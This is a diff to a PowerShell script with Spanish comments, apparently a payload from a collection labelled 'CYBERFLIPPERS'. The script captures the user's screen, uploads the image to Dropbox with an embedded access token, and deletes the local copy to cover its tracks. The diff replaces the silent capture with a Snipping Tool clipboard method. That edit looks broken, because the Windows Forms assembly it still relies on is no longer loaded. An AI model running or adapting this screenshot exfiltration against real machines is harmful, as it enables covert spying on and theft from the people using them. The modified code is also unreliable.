@@ -1,18 +1,6 @@
 # Define el token de acceso de Dropbox
 $db = ""
 
-# Encabezado artístico
-$header = @"
-########################################################################################################################
-#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
-#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
-#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
-#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
-#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
-#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
- #########################################################################################################################           
-"@
-
 # Función para subir archivos a Dropbox
 function DropBox-Upload {
     [CmdletBinding()]
@@ -34,18 +22,15 @@ function DropBox-Upload {
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-# Función para capturar la pantalla
+# Función para capturar la pantalla utilizando la herramienta de captura de pantalla de Windows
 function Capture-Screen {
-    Add-Type -AssemblyName System.Windows.Forms
+    $filePath = "$env:TEMP\sc.png"
+    # Usa la herramienta de captura de pantalla integrada en Windows (Snipping Tool)
+    Start-Process "ms-screenclip:" -ArgumentList "/clip"
+    Start-Sleep -Seconds 5
     Add-Type -AssemblyName System.Drawing
-    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
-    $filePath = "$env:temp\sc.png"
-    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
-    $graphics.Dispose()
-    $bitmap.Dispose()
+    $clipboard = [System.Windows.Forms.Clipboard]::GetImage()
+    $clipboard.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
     return $filePath
 }
 
@@ -53,22 +38,15 @@ try {
     # Capturar la pantalla y obtener la ruta del archivo
     $screenshotPath = Capture-Screen
 
-    # Leer contenido de la captura de pantalla
-    $fileContent = Get-Content -Path $screenshotPath -Raw
-    $combinedContent = $header + "`r`n" + $fileContent
-    $tempFilePath = "$env:temp\sc_with_header.png"
-    Set-Content -Path $tempFilePath -Value $combinedContent
-
-    # Subir la captura de pantalla con encabezado a Dropbox
+    # Subir la captura de pantalla a Dropbox
     if (-not ([string]::IsNullOrEmpty($db))) {
-        DropBox-Upload -f $tempFilePath
+        DropBox-Upload -f $screenshotPath
     } else {
         Write-Error "No se proporcionó el token de acceso de Dropbox."
     }
 
-    # Limpiar los archivos de captura de pantalla
+    # Limpiar el archivo de captura de pantalla
     Remove-Item -Path $screenshotPath -Force
-    Remove-Item -Path $tempFilePath -Force
 }
 catch {
     Write-Error "Ocurrió un error: $_"
